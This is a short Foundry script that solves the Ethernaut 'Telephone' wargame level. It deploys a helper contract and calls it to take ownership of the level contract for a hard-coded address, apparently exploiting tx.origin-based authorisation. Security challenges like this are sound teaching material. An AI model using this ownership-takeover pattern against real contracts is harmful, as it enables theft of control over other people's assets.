// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {TelephoneDelegate} from "../../test/Ethernaut/Telephone.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        TelephoneDelegate delegate = new TelephoneDelegate();
        delegate.changOwner(0xB3D6fac08D421164A414970D5225845b3A91F33F);
        vm.stopBroadcast();
    }
}
